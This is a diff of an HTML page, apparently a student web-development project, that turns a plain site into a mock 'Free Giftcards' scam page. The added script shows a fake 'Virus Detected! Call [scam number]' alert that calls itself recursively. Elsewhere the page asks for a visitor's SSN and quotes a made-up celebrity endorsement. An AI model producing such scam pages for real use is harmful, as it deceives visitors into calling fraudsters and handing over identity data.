@@ -1,35 +1,41 @@
 <html lang="en">
-<!--Version 6.0
-	Name: Ben S
-	Date Completed: 9-13-19
+<!--Version 4.0 
+	Name:Ben Sebastian
+	Date Completed:9/5/2019
  -->
 <head>
 
-<title> Web Development User #13 </title>
-<script src="JS/WebDevUser13.js"></script>
-<link rel="stylesheet" href="User13css/day.css">  
-<style>
-   
-    .titlemania{
-        color: #003b6f;
-        font-family: cursive;
-        text-align: center
-    }
-    </style>
+<title> FreeGiftcards.Net</title>
+
+    <meta name="author" content="your name" />
+
+        <meta name="description" content="" />
+
+
+<!-- you should always add your stylesheet (css) in the head tag so that it starts loading before the page html is being displayed -->        
+
+        <link rel="stylesheet" href="CSS/WebDevUser13.css" type="text/css" />
+    <script>
+  
+  function myFunction(){
+    alert("                         **************Warning**************                                                                                                                                                                                               Virus Detected! Call [insert scam phone number] to delete the virus immediately!");
+    
+    myFunction();
+  }
+  
+</script>
 </head>
 
 <body>
-    <button data-file="day">Day</button>
-    <button data-file="night">Night</button>
 
-                    <marquee>   <h1><a href="webDevUser13.html">Free Giftcards</a></h1>
-                    </marquee>
-    
-    <audio id="abc" src="JS/mjh.mp3" preload="auto"></audio>
+
+<!-- webpage content goes here in the body -->
+
 
 
      
-
+                    <marquee>   <h1><a href="webDevUser13.html" id="logoLink">Free Giftcards</a></h1>
+                    </marquee>
              
                            
                 <div id="nav">
@@ -38,10 +44,7 @@
 
                                 <a class="a2" href="webDevUser13_About.html">About</a>
 
-                                <a class="a2" href="webDevUser13_Games.html">Games</a>
-                    
-                                <a class="a2" href="webDevUser13_FAQ.html">FAQ</a>
-                    
+                                <a class="a2" href="webDevUser13_Games.html">Games</a>       
 
                 </div>
 
@@ -59,7 +62,7 @@
 
 "Love These!"
                             -Jeff Bezos CEO of Amazon
-                        </p> <img src="User13/JeffBezos.jpg" width="5%"  alt="Picture of Jeff Bezos">
+                        </p> <img src="images/User13/JeffBezos.jpg" width="5%"  alt="Picture of Jeff Bezos">
 
                     <h3>
 Target                    </h3>
@@ -82,7 +85,7 @@ Target                    </h3>
  <tr><td>Itunes</td><td>32 billion</td></tr>
  </table>
 <br>
-                    <img src="User13/giftcardsgalore.jpg" width="25%"  alt="Picture of a Wall of many giftcards">
+                    <img src="images/User13/giftcardsgalore.jpg" width="25%"  alt="Picture of a Wall of many giftcards">
 
 
                     <h2>Giftcards Available</h2>
@@ -113,37 +116,7 @@ Just enter your SSN  <input type="number" id="SSN" name="SSN"
 
                 </div>
 
-    <script src="JS/jquery-1.7.1.js"></script>
 
-    <script>
-    (function(){
-        
-        var link = $('link');
-        $('button').on('click', function() {
-            var $this = $(this),
-                stylesheet = $this.data('file');
-            
-            link.attr('href','User13css/' + stylesheet + '.css');
-            
-            $this
-                .siblings('button')
-                    .removeAttr('disabled')
-                    .end()
-                    .attr('disabled', 'disabled');
-            
-            
-        });
-        
-        
-        
-    })();
-    
-    </script>
-  <script>
-      $("h1").addClass('titlemania');
-    </script>  
-    
-    
 </body>
 
 </html>
